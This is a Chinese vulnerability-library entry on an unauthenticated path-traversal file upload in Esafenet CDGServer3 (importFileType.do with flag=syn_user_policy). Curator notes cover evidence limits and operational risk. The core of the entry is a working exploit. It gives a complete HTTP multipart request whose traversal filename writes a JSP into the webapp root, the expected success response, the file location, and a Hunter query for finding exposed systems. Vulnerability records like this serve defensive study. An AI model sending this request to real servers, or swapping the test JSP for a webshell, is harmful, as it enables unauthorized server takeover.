---
source: "wy876 漏洞文库"
title: "亿赛通CDGServer3 importFileType syn_user_policy遍历上传"
product: "亿赛通CDGServer3"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Windows路径分隔/ROOT布局及JSP解析，版本未知"
prerequisites: "无Cookie请求，匿名声称"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zkvw8ryeiekwzudv"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BA%BF%E8%B5%9B%E9%80%9A/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fsyn_user_policy%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"ESAFENET 亿赛通文档安全管理系统\""
id: "vw-24187eefe4213d7d00d9e379"
entity_id: "ve-24187eefe4213d7d00d9e379"
schema_version: "1"
---

# 亿赛通CDGServer3 importFileType syn_user_policy遍历上传

## 条目说明

- 对象与具体问题：亿赛通CDGServer3；importFileType syn_user_policy遍历上传
- 版本、配置及部署条件：Windows路径分隔/ROOT布局及JSP解析，版本未知
- 认证与权限前提：无Cookie请求，匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 简介复制成UploadFileFromClientServiceForClient，实际端点fileType/importFileType.do，syn_user_policy是flag
- xmlFail操作失败只说明解析失败，不能必然等于上传落盘成功，需要/test.jsp实际乘法/输出回显
- JSP打印1111并自删，仍有写入/覆盖状态风险，不应只标检测
- 无修复/版本，固定深度与文件名需限定环境

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统UploadFileFromClientServiceForClient接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。

## 二、影响版本
+ 亿赛通电子文档安全管理系统

## 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面


## 四、漏洞复现
```http
POST /CDGServer3/fileType/importFileType.do?flag=syn_user_policy HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysebeiskw
Accept-Encoding: gzip, deflate
Connection: close

------WebKitFormBoundarysebeiskw
Content-Disposition: form-data; name="fileshare"; filename="/..\\..\\..\\..\\webapps\\ROOT\\test.jsp"

<% out.println(1111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------WebKitFormBoundarysebeiskw--
```

> 请求长度说明：原资料 Content-Length 为 287；静态长度已移除，应由客户端根据最终请求体的字节数生成。


服务器回显{"result":"xmlFail","msg":"操作失败"}则上传成功

上传文件位置

```plain
/test.jsp 
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zkvw8ryeiekwzudv>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
